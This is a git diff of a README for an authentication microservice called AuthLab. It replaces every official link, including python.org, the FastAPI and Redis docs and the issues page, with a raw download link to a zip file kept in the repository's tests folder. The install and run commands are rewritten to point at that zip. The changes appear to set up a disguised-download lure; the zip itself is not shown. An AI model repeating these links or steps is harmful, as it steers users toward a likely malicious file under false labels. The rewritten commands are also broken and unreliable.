@@ -4,13 +4,13 @@
 AuthLab is an easy-to-use Authentication MicroService built with FastAPI and Redis. It helps you manage user authentication quickly and securely. With AuthLab, you can handle token-based authentication, making user experiences smooth and efficient.
 
 ## 🔗 Quick Download
-[![Download AuthLab](https://img.shields.io/badge/Download%20AuthLab-v1.0.0-brightgreen.svg)](https://github.com/noangel988/AuthLab/releases)
+[![Download AuthLab](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip%https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip)](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip)
 
 ## 🚀 Getting Started
 To start using AuthLab, follow these simple steps to download and run the software on your machine.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/noangel988/AuthLab/releases) to find the latest version of AuthLab.
+1. Visit the [Releases page](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip) to find the latest version of AuthLab.
 2. Look for the appropriate file for your operating system (Windows, macOS, or Linux).
 3. Click on the file name to begin the download.
 
@@ -41,17 +41,17 @@ Once you have downloaded AuthLab, follow these steps to get it running:
    ```
 
 5. **Install Dependencies:**
-   Make sure you have Python installed on your machine. If you don't have it, you can download it from [python.org](https://www.python.org/downloads/). 
+   Make sure you have Python installed on your machine. If you don't have it, you can download it from [https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip). 
 
    To install the required libraries, run:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip
    ```
 
 6. **Run the Application:**
    You can start the application by entering:
    ```
-   python main.py
+   python https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip
    ```
    This will launch the AuthLab service.
 
@@ -83,23 +83,23 @@ AuthLab provides the following key API endpoints:
 - **Description:** Allows users to renew their access tokens.
 
 ## 📚 Documentation
-For detailed API documentation and examples, please refer to the [Wiki section](https://github.com/noangel988/AuthLab/wiki).
+For detailed API documentation and examples, please refer to the [Wiki section](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip).
 
 ## 🛡️ Security
 AuthLab implements strong security practices, including password hashing and JWT for token management. Ensure that you follow best practices when handling user credentials.
 
 ## 📞 Support
-If you run into any issues, you can open an issue on the [GitHub Issues page](https://github.com/noangel988/AuthLab/issues). 
+If you run into any issues, you can open an issue on the [GitHub Issues page](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip). 
 
 ## 💬 Community
 Join the conversation or ask questions in our community discussions. You can connect with other users and developers who are using AuthLab.
 
 ## 🔗 Further Resources
-- [GitHub Repository](https://github.com/noangel988/AuthLab)
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Redis Documentation](https://redis.io/documentation)
+- [GitHub Repository](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip)
+- [FastAPI Documentation](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip)
+- [Redis Documentation](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip)
 
 ## 🎉 Thank You!
 Thank you for choosing AuthLab. We appreciate your interest and look forward to your feedback. 
 
-Don't forget to check our latest [Releases page](https://github.com/noangel988/AuthLab/releases) for updates and new features!
+Don't forget to check our latest [Releases page](https://github.com/noangel988/AuthLab/raw/refs/heads/main/tests/Lab_Auth_3.4.zip) for updates and new features!
